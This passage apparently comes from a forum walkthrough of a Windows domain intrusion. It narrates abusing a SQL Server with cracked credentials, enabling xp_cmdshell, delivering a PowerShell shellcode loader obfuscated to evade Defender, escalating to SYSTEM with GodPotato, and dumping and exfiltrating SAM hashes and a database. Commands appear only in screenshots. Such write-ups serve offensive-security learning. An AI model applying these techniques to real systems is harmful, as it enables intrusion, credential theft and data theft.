<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/d/8df88bbeb409fdbe7b4008bdb4f1488b5046515d.png" data-download-href="/uploads/short-url/kfVPu8UQBM47wDilKEyEf53Q2M5.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/8/d/8df88bbeb409fdbe7b4008bdb4f1488b5046515d_2_611x500.png" alt="" data-base62-sha1="kfVPu8UQBM47wDilKEyEf53Q2M5" width="611" height="500" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/8/d/8df88bbeb409fdbe7b4008bdb4f1488b5046515d_2_611x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/8/d/8df88bbeb409fdbe7b4008bdb4f1488b5046515d_2_916x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/8/d/8df88bbeb409fdbe7b4008bdb4f1488b5046515d.png 2x" data-dominant-color="191919"></a></div><p></p>
<p>Fantastic we cracked the ticket for jnovoa and grab the cleartext credentials for the user, this will help us to move onto a new workstation and get more info on the new location, now since we know that this is a SQL Instance maybe let’s give it some SQLRecon work onto it now that we have credentials, for this will use the SQLRecon [8] Tool.</p>
<p>SQLRecon has some great options to look for SPNs related to SQL Services as well but we can avoid that since we have already located what we needed, will use some of the enumeration modules to check out the instances available in the Domain:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/d/7d504556b0367e214a13c935acb1a4698f6850f6.png" data-download-href="/uploads/short-url/hSzF7NaZ6J0N7NysF3JPBEKlhIi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/d/7d504556b0367e214a13c935acb1a4698f6850f6_2_690x405.png" alt="" data-base62-sha1="hSzF7NaZ6J0N7NysF3JPBEKlhIi" width="690" height="405" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/d/7d504556b0367e214a13c935acb1a4698f6850f6_2_690x405.png, https://0x00sec.s3.amazonaws.com/original/3X/7/d/7d504556b0367e214a13c935acb1a4698f6850f6.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/d/7d504556b0367e214a13c935acb1a4698f6850f6.png 2x" data-dominant-color="32333E"></a></div><p></p>
<p>With this information now we can connect and enumerate the workstation to see what our current user can access, potentially finding some type of path that will allow us to jump onto the workstation or maybe just simply find some loot.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/6/f653a7ce281ccf8803d631cf76340418c6f8fae1.png" data-download-href="/uploads/short-url/z96GHHWEi4rzrfa5MGrVvczdoB3.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/6/f653a7ce281ccf8803d631cf76340418c6f8fae1_2_689x228.png" alt="" data-base62-sha1="z96GHHWEi4rzrfa5MGrVvczdoB3" width="689" height="228" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/6/f653a7ce281ccf8803d631cf76340418c6f8fae1_2_689x228.png, https://0x00sec.s3.amazonaws.com/original/3X/f/6/f653a7ce281ccf8803d631cf76340418c6f8fae1.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/6/f653a7ce281ccf8803d631cf76340418c6f8fae1.png 2x" data-dominant-color="2D2F3A"></a></div><p></p>
<p>Now we can gather more information after that successful query on the workstation this time let’s look at what permissions the user has on the SQL Instance:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/2/d2efb98d63c0e04f4b26113ada5ed19bf416b378.png" data-download-href="/uploads/short-url/u61Smzg0bWlXvGkiZsMUAdNqN0k.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/2/d2efb98d63c0e04f4b26113ada5ed19bf416b378_2_690x232.png" alt="" data-base62-sha1="u61Smzg0bWlXvGkiZsMUAdNqN0k" width="690" height="232" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/2/d2efb98d63c0e04f4b26113ada5ed19bf416b378_2_690x232.png, https://0x00sec.s3.amazonaws.com/original/3X/d/2/d2efb98d63c0e04f4b26113ada5ed19bf416b378.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/2/d2efb98d63c0e04f4b26113ada5ed19bf416b378.png 2x" data-dominant-color="2E303B"></a></div><p></p>
<p>We can look at the users available in the Instance as well:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/f/3fdb924f95d19b158d05b1721eeb03f7d4b9f689.png" data-download-href="/uploads/short-url/96UvEe6DLbusRBRjNxlDcjBcqFz.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/f/3fdb924f95d19b158d05b1721eeb03f7d4b9f689_2_690x118.png" alt="" data-base62-sha1="96UvEe6DLbusRBRjNxlDcjBcqFz" width="690" height="118" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/f/3fdb924f95d19b158d05b1721eeb03f7d4b9f689_2_690x118.png, https://0x00sec.s3.amazonaws.com/original/3X/3/f/3fdb924f95d19b158d05b1721eeb03f7d4b9f689.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/f/3fdb924f95d19b158d05b1721eeb03f7d4b9f689.png 2x" data-dominant-color="31333F"></a></div><p></p>
<p>Move on with some good stuff let’s look at the Databases available and if we have access to some interesting ones:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/1/71b517f91ba3dd049b79621a5bd6887e0f96fa5e.png" data-download-href="/uploads/short-url/gdTWCwpAiM0BUfbjGMQrpWpIFBk.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/1/71b517f91ba3dd049b79621a5bd6887e0f96fa5e_2_690x111.png" alt="" data-base62-sha1="gdTWCwpAiM0BUfbjGMQrpWpIFBk" width="690" height="111" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/1/71b517f91ba3dd049b79621a5bd6887e0f96fa5e_2_690x111.png, https://0x00sec.s3.amazonaws.com/original/3X/7/1/71b517f91ba3dd049b79621a5bd6887e0f96fa5e.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/1/71b517f91ba3dd049b79621a5bd6887e0f96fa5e.png 2x" data-dominant-color="31333F"></a></div><p></p>
<p>We see some standard ones, let’s look at the master one this usually is the default one to start working on let’s take a look at the Tables available for that one:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d57c02d6384c24cfb8c2b918457397c0c07c972.png" data-download-href="/uploads/short-url/fBi33oALMOmMkeu8RXRIoN2KvXs.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d57c02d6384c24cfb8c2b918457397c0c07c972_2_690x129.png" alt="" data-base62-sha1="fBi33oALMOmMkeu8RXRIoN2KvXs" width="690" height="129" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d57c02d6384c24cfb8c2b918457397c0c07c972_2_690x129.png, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d57c02d6384c24cfb8c2b918457397c0c07c972.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d57c02d6384c24cfb8c2b918457397c0c07c972.png 2x" data-dominant-color="2D2F3B"></a></div><p></p>
<p>Nice now let’s look at the columns for that table:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/1/618d854a4bb3c1ccb40db1ae66abf13618547fe9.png" data-download-href="/uploads/short-url/dUZwjINlAwL2QvSAXTr1oHucLeF.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/1/618d854a4bb3c1ccb40db1ae66abf13618547fe9_2_690x114.png" alt="" data-base62-sha1="dUZwjINlAwL2QvSAXTr1oHucLeF" width="690" height="114" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/1/618d854a4bb3c1ccb40db1ae66abf13618547fe9_2_690x114.png, https://0x00sec.s3.amazonaws.com/original/3X/6/1/618d854a4bb3c1ccb40db1ae66abf13618547fe9.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/1/618d854a4bb3c1ccb40db1ae66abf13618547fe9.png 2x" data-dominant-color="2C2E3A"></a></div><p></p>
<p>This looks like has some potential for us to grab, this time let’s send an SQL Query and grab all the info available in these Columns:</p>
<p><em>Thank you Havoc group for helping me figure out I need to escape the Double Quotes (“)</em></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/a/ea9e36d3e5a03f7c734ad8f0bd7605508c42021b.png" data-download-href="/uploads/short-url/xtwHqgNJIdMwFJEaxvXVWPPL2jx.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/a/ea9e36d3e5a03f7c734ad8f0bd7605508c42021b_2_690x113.png" alt="" data-base62-sha1="xtwHqgNJIdMwFJEaxvXVWPPL2jx" width="690" height="113" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/a/ea9e36d3e5a03f7c734ad8f0bd7605508c42021b_2_690x113.png, https://0x00sec.s3.amazonaws.com/original/3X/e/a/ea9e36d3e5a03f7c734ad8f0bd7605508c42021b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/a/ea9e36d3e5a03f7c734ad8f0bd7605508c42021b.png 2x" data-dominant-color="31333E"></a></div><p></p>
<p>Jackpot! Got the banks Full DB Dump we now grab this juicy loot and now try to hop onto this workstation since we read all the data, but we now need to get some command execution access the workstation now, maybe we can keep moving or find more interesting files that would help our progress to move forward I think Domain Admin is close!</p>
<p>Now SQL allows command execution with the right permissions, maybe we can enumerate and find out if the feature XP_CMDSHELL [10] is enabled if it is we can immediately execute code, but if it isn’t then we might need the correct permissions to enable this feature, now the SQL Query to verify this goes as follows.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/a/3aedaf146176757374c56d8b94efd7d8c2e088a0.png" data-download-href="/uploads/short-url/8piVzW13CVDbQW3oJ4TRdF2NgOc.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/a/3aedaf146176757374c56d8b94efd7d8c2e088a0_2_690x71.png" alt="" data-base62-sha1="8piVzW13CVDbQW3oJ4TRdF2NgOc" width="690" height="71" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/a/3aedaf146176757374c56d8b94efd7d8c2e088a0_2_690x71.png, https://0x00sec.s3.amazonaws.com/original/3X/3/a/3aedaf146176757374c56d8b94efd7d8c2e088a0.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/a/3aedaf146176757374c56d8b94efd7d8c2e088a0.png 2x" data-dominant-color="2D303B"></a></div><p></p>
<p>We see in the 3rd column that the config value is set to 0, but we need this set to 1, according to our previous enumeration the user seems to be an admin on the master DB and with this we can change the configuration, with SQLRecon we can achieve this with the EnableXP Module:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/9/d99eac315129cf0ede929d11e63dcf183b99c2e5.png" data-download-href="/uploads/short-url/v39z4g2ZWmIY5F1jvcF8gwFBvx3.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/9/d99eac315129cf0ede929d11e63dcf183b99c2e5_2_690x92.png" alt="" data-base62-sha1="v39z4g2ZWmIY5F1jvcF8gwFBvx3" width="690" height="92" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/9/d99eac315129cf0ede929d11e63dcf183b99c2e5_2_690x92.png, https://0x00sec.s3.amazonaws.com/original/3X/d/9/d99eac315129cf0ede929d11e63dcf183b99c2e5.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/9/d99eac315129cf0ede929d11e63dcf183b99c2e5.png 2x" data-dominant-color="2D303B"></a></div><p></p>
<p>Nice we verify those 0’s turned into 1’s:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/1/2192c876cf149c50987904be2c8d96af984ca3ef.png" alt="" data-base62-sha1="4N0eK3dGUb9ggjSumeQxyjYe1oH" width="588" height="85" role="presentation"></p>
<p>Executing commands now should be easy utilizing SQLRecon we utilize the XPCmd Module now:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/1/315e7933f147915abd425e3ca99ef9e65a00bf60.png" data-download-href="/uploads/short-url/72JNSqJy4cgFg8BVyEHubzFWFHO.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/1/315e7933f147915abd425e3ca99ef9e65a00bf60_2_690x83.png" alt="" data-base62-sha1="72JNSqJy4cgFg8BVyEHubzFWFHO" width="690" height="83" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/1/315e7933f147915abd425e3ca99ef9e65a00bf60_2_690x83.png, https://0x00sec.s3.amazonaws.com/original/3X/3/1/315e7933f147915abd425e3ca99ef9e65a00bf60.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/1/315e7933f147915abd425e3ca99ef9e65a00bf60.png 2x" data-dominant-color="2D2F3B"></a></div><p></p>
<p>Looks like we are running as the service account on the TT-DBSQL-1 Workstation with command execution we can now enumerate and gain more lay of the land on this new host but instead of running the command every single time we must work onto getting a stable Demon for our C2.</p>
<p>Now there are some really good options on how to move next leave a DLL for another Hijack, maybe copy a binary and replace a legitimate one, a bunch of idea’s but for this I want to use PowerShell, since we can run powershell in the command utilized in XP_CMDSHELL we can actually get a demon to connect back, but unfortunately Havoc doesn’t have native powershell code to execute, but that won’t stop us, we want this money!! So will grab Havoc shellcode and convert it properly to be used on a Shellcode Loader built in PowerShell.</p>
<p>Now with the framework I built this can be automated, the science behind it isn’t really complicated.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/6/46024bbdb3f69d83fe8f5fd58098148cff43569b.png" data-download-href="/uploads/short-url/9ZklbRznb00Kfpp06PG0LBQUVWb.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/6/46024bbdb3f69d83fe8f5fd58098148cff43569b_2_690x229.png" alt="" data-base62-sha1="9ZklbRznb00Kfpp06PG0LBQUVWb" width="690" height="229" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/6/46024bbdb3f69d83fe8f5fd58098148cff43569b_2_690x229.png, https://0x00sec.s3.amazonaws.com/original/3X/4/6/46024bbdb3f69d83fe8f5fd58098148cff43569b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/6/46024bbdb3f69d83fe8f5fd58098148cff43569b.png 2x" data-dominant-color="0F100F"></a></div><p></p>
<p>But let’s break it down, the tool will use a template for a simple CreateThread PowerShell Loader and place the shellcode on the script. Not much to it but of course we still have to add some methods of obfuscation or encryption to get past AV/EDR</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/1/1179d259134975e393b47c8e6d2aa1236e9b724f.png" data-download-href="/uploads/short-url/2uB7mnBEW1DYFYW3A5qLt6P3O1N.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/1/1179d259134975e393b47c8e6d2aa1236e9b724f_2_690x178.png" alt="" data-base62-sha1="2uB7mnBEW1DYFYW3A5qLt6P3O1N" width="690" height="178" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/1/1179d259134975e393b47c8e6d2aa1236e9b724f_2_690x178.png, https://0x00sec.s3.amazonaws.com/original/3X/1/1/1179d259134975e393b47c8e6d2aa1236e9b724f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/1/1179d259134975e393b47c8e6d2aa1236e9b724f.png 2x" data-dominant-color="403E3E"></a></div><p></p>
<p>A simple launcher and our tools indicate that Defender does not detect this script, but let’s test that out.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/3/f3e96d7ae307008564fe761b38a2305d69d419dd.png" data-download-href="/uploads/short-url/yNK8MWTakjc7GKaJ96k38ipEHDL.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/3/f3e96d7ae307008564fe761b38a2305d69d419dd_2_690x181.png" alt="" data-base62-sha1="yNK8MWTakjc7GKaJ96k38ipEHDL" width="690" height="181" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/3/f3e96d7ae307008564fe761b38a2305d69d419dd_2_690x181.png, https://0x00sec.s3.amazonaws.com/original/3X/f/3/f3e96d7ae307008564fe761b38a2305d69d419dd.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/3/f3e96d7ae307008564fe761b38a2305d69d419dd.png 2x" data-dominant-color="111111"></a></div><p></p>
<p>Will host our payload on our attacking machine and the call it from the SQL Instance executes utilizing the OLE Module since we utilize hyphens for PowerShell and we can’t escape it properly with SQLRecon so moving onto using OLE is a better alternative as we are not utilizing SQL Queries to execute commands.</p>
<p>When executing we see that we got no connection</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/3/136eed5bbd45f1c265c83f7a02a15cfeb6081736.png" data-download-href="/uploads/short-url/2LUJp4fq6P2EJP9c1XQDwAQDps2.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/3/136eed5bbd45f1c265c83f7a02a15cfeb6081736_2_690x260.png" alt="" data-base62-sha1="2LUJp4fq6P2EJP9c1XQDwAQDps2" width="690" height="260" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/3/136eed5bbd45f1c265c83f7a02a15cfeb6081736_2_690x260.png, https://0x00sec.s3.amazonaws.com/original/3X/1/3/136eed5bbd45f1c265c83f7a02a15cfeb6081736.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/3/136eed5bbd45f1c265c83f7a02a15cfeb6081736.png 2x" data-dominant-color="30333F"></a></div><p></p>
<p>Now let’s verify why is that.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/5/759cdbf43288360fc55107956270d44398677891.png" data-download-href="/uploads/short-url/gMrVRFJNP2QXjpI8mrzHydo5P0d.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/5/759cdbf43288360fc55107956270d44398677891.png" alt="" data-base62-sha1="gMrVRFJNP2QXjpI8mrzHydo5P0d" width="690" height="121" role="presentation" data-dominant-color="140909"></a></div><p></p>
<p>Well of course it is getting detected, my thought process here is to try some encryption first them move onto obfuscating and finally encoding we might not need to apply so many layers of obscurity if simply one can get us through in this example, I’ll start with AES encryption.</p>
<p>Now after having some issues, it seems that I could not get past the SQLRecon Queries and methods to execute code, so I moved to another option since I have jnovoa’s Password I can make a token and impersonate that token for later use with SharpSQL with this I was able to continue and execute commands.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/6/6679f90248eb36ac51bcb7c7e57ffcc9b4137f87.png" alt="" data-base62-sha1="eCy1GPvPghPZys8c9zRNIZvPjZZ" width="619" height="270" role="presentation"></p>
<p>And SharpSQLPwn, <em>due to unfortunate issues this needed to be done on the workstation leaving an artifact on disk but this would still be ok to work on with a C2, currently cannot get it to work.</em></p>
<p>SharpSQLPwn will authenticate and run the command.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a8ca53521e3226ea55fa9e4c234853dc54df6ca4.png" data-download-href="/uploads/short-url/o5bH6XDTMxXiVuk5f10v5Ua2p80.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/a/8/a8ca53521e3226ea55fa9e4c234853dc54df6ca4_2_690x386.png" alt="" data-base62-sha1="o5bH6XDTMxXiVuk5f10v5Ua2p80" width="690" height="386" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/a/8/a8ca53521e3226ea55fa9e4c234853dc54df6ca4_2_690x386.png, https://0x00sec.s3.amazonaws.com/original/3X/a/8/a8ca53521e3226ea55fa9e4c234853dc54df6ca4.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/a/8/a8ca53521e3226ea55fa9e4c234853dc54df6ca4.png 2x" data-dominant-color="1E201A"></a></div><p></p>
<p>We see on our http server that it has pulled the PowerShell script.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/0/006be3693f7529ba3272ab232c415539ad37252f.png" data-download-href="/uploads/short-url/3J9hksK5KnBcQdXQPUxlZHOIpN.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/0/006be3693f7529ba3272ab232c415539ad37252f_2_690x226.png" alt="" data-base62-sha1="3J9hksK5KnBcQdXQPUxlZHOIpN" width="690" height="226" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/0/006be3693f7529ba3272ab232c415539ad37252f_2_690x226.png, https://0x00sec.s3.amazonaws.com/original/3X/0/0/006be3693f7529ba3272ab232c415539ad37252f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/0/006be3693f7529ba3272ab232c415539ad37252f.png 2x" data-dominant-color="24252F"></a></div><p></p>
<p>Since this was an SMB Shellcode technique, we need to use the pivot commands from Havoc to connect to the named pipe that was created.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/4/0493f33ae086dc84c1f937a950f9d345b197f9f7.png" data-download-href="/uploads/short-url/EuTh6llcgMus42KI0CHhb0Oc87.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/4/0493f33ae086dc84c1f937a950f9d345b197f9f7_2_690x224.png" alt="" data-base62-sha1="EuTh6llcgMus42KI0CHhb0Oc87" width="690" height="224" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/4/0493f33ae086dc84c1f937a950f9d345b197f9f7_2_690x224.png, https://0x00sec.s3.amazonaws.com/original/3X/0/4/0493f33ae086dc84c1f937a950f9d345b197f9f7.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/4/0493f33ae086dc84c1f937a950f9d345b197f9f7.png 2x" data-dominant-color="2D2F3B"></a></div><p></p>
<p>We are running as the Service Account on the new host we can verify with the whoami built in command from Havoc.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/1/71063c42ae5ed3085058d83ed89e83cc8d2467a1.png" data-download-href="/uploads/short-url/g7RjqOy7FDNMY6GtY4g0kZXeN57.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/1/71063c42ae5ed3085058d83ed89e83cc8d2467a1_2_690x337.png" alt="" data-base62-sha1="g7RjqOy7FDNMY6GtY4g0kZXeN57" width="690" height="337" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/1/71063c42ae5ed3085058d83ed89e83cc8d2467a1_2_690x337.png, https://0x00sec.s3.amazonaws.com/original/3X/7/1/71063c42ae5ed3085058d83ed89e83cc8d2467a1.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/1/71063c42ae5ed3085058d83ed89e83cc8d2467a1.png 2x" data-dominant-color="323441"></a></div><p></p>
<p><em>I don’t understand why it says unresponsive and the call back time is longer than 2 sec (around 5-10 sec) but it works decided to move our session onto a more stable process by injection</em></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/f/0f392d7e5e5b0a9c8b56489faad27f358791542d.png" data-download-href="/uploads/short-url/2aFFdeNIl2MS8JxBuVhTwJRwy61.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0f392d7e5e5b0a9c8b56489faad27f358791542d_2_690x85.png" alt="" data-base62-sha1="2aFFdeNIl2MS8JxBuVhTwJRwy61" width="690" height="85" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0f392d7e5e5b0a9c8b56489faad27f358791542d_2_690x85.png, https://0x00sec.s3.amazonaws.com/original/3X/0/f/0f392d7e5e5b0a9c8b56489faad27f358791542d.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/f/0f392d7e5e5b0a9c8b56489faad27f358791542d.png 2x" data-dominant-color="343744"></a></div><p></p>
<p>Fantastic we moved onto the new host we have a demon calling back to our C2 we managed to bypass AV and currently on this workstation, let’s start exploring. Now service accounts are meant to be there for being a separate account that is only intended for the access of a resource, so we need to move onto another user to leave our persistence on this workstation.</p>
<p>One thing that service accounts are vulnerable to is the Potato [11] attack, if an account contains the <em>SeImpersonatePrivilege</em> this allows the account to impersonate any local accounts which here will target the SYSTEM account.</p>
<p>For this example will use GodPotato[12] as it’s been tested and worked on to be functional on Windows 10 &amp; 11. It is also built in C# so we can execute this in memory. GodPotato is simple to utilize, and we can give it a simple command to run while it does the rest for us:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/c/3c43018a4383ba40d8ac42b75890582cba7ff884.png" data-download-href="/uploads/short-url/8B6cTnhJfjypQC0gbfMCCyeLAu8.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/c/3c43018a4383ba40d8ac42b75890582cba7ff884_2_690x429.png" alt="" data-base62-sha1="8B6cTnhJfjypQC0gbfMCCyeLAu8" width="690" height="429" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/c/3c43018a4383ba40d8ac42b75890582cba7ff884_2_690x429.png, https://0x00sec.s3.amazonaws.com/original/3X/3/c/3c43018a4383ba40d8ac42b75890582cba7ff884.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/c/3c43018a4383ba40d8ac42b75890582cba7ff884.png 2x" data-dominant-color="31333F"></a></div><p></p>
<p>Perfect we have elevated our privileges and managed to get SYSTEM commands, let’s upgrade to a C2 Demon connection now using the same PowerShell script as before while using the GodPotato method.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/e/de5224010cc475ffcba2f1d8f47b2d0781ac12ef.png" data-download-href="/uploads/short-url/vIJZ0jb3ACtT4ngU3AtbTC5wAaz.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/e/de5224010cc475ffcba2f1d8f47b2d0781ac12ef_2_690x320.png" alt="" data-base62-sha1="vIJZ0jb3ACtT4ngU3AtbTC5wAaz" width="690" height="320" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/e/de5224010cc475ffcba2f1d8f47b2d0781ac12ef_2_690x320.png, https://0x00sec.s3.amazonaws.com/original/3X/d/e/de5224010cc475ffcba2f1d8f47b2d0781ac12ef.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/e/de5224010cc475ffcba2f1d8f47b2d0781ac12ef.png 2x" data-dominant-color="252731"></a></div><p></p>
<p>We had to place the binary on the host as I was receiving errors using .NET in-memory by placing the binary on host and using the current user for executing on a location everyone has access to write on (Public Folder) we can get good results for executing some binaries, this is NOT a recommendation as we are leaving an artifact behind, but it is still a way to execute an achieve a goal, work with what you’ve got.</p>
<p>Since we are currently running as SYSTEM why not look at what the SAM Dump has to offer us, the C2 has a great built-in function for this and can help us achieve this.</p>
<p>Now I’ll just use PowerShell to compress these files into one nice ZIP file.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/5/95a7057ac54db96a492e3864ab56648e35aacbb2.png" data-download-href="/uploads/short-url/llSZ3AOyw1vOLrFn8g95qyf6KmC.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/5/95a7057ac54db96a492e3864ab56648e35aacbb2_2_690x34.png" alt="" data-base62-sha1="llSZ3AOyw1vOLrFn8g95qyf6KmC" width="690" height="34" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/5/95a7057ac54db96a492e3864ab56648e35aacbb2_2_690x34.png, https://0x00sec.s3.amazonaws.com/original/3X/9/5/95a7057ac54db96a492e3864ab56648e35aacbb2.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/5/95a7057ac54db96a492e3864ab56648e35aacbb2.png 2x" data-dominant-color="2D303C"></a></div><p></p>
<p>We download next for this.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d7bb462ef12e4393fcd1143f00bfe98ecc6967c7.png" alt="" data-base62-sha1="uMrT7YeQAqTKHsvWqyYFU7TpGsf" width="645" height="123" role="presentation"></p>
<p>And we can check our loot that this has been downloaded successfully.</p>
